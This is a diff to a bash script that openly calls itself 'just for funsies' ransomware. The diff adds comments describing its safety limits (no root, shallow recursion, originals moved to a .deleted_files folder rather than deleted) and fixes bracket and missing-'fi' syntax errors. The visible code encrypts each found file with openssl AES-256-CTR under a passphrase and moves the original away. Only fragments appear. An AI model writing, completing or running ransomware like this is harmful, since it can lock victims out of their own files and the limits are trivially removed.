@@ -1,5 +1,14 @@
 #!/usr/bin/env bash
 
+# Just for funsies ransomware written in bash 
+# Using built-in Linux tools
+# It has three layers to protect you frpm yourself
+# Don't mess with them!
+
+# 1) Running as root is DISALLOWED - reduce scope of oopsies
+# 2) Search recursion is limited to 1 - reduce depth of oopsies
+# 3) The plaintext files are not deleted. They are moved to .deleted_files
+
 # SANITY AND SAFETY CHECK! 
 # Prevent execution as root
 # This script should not be run with elevated privileges to 
@@ -124,12 +133,14 @@ encrypt_file() {
 
     # Dpn't delete files
     # Rather, move them to a directory specified in the function call
-    if ! [[ -e "$2"]]; then
+    if ! [[ -e "$2" ]]; then
       mkdir -p "$2"
+    fi
     
     # Encrypt file; delete the original if successful
     if openssl enc -aes-256-ctr -pass pass:"$aes_sk" -iter 100 -a -in "$1" -out "$1.aes256.100"; then
       mv "$1" "$2" 
+    fi
     
     # Not really necessary for local variables but eh
     unset hash_input
@@ -159,5 +170,5 @@ find_files "rx_dir" "exposed_files"
 echo "---------ENCRYPTING---------"
 echo ":"
 for file in "${exposed_files[@]}"; do
-    encrypt_file "$file" ".deleted_files"# Always double-quote variable expansions
+    encrypt_file "$file" ".deleted_files" # Always double-quote variable expansions
 done
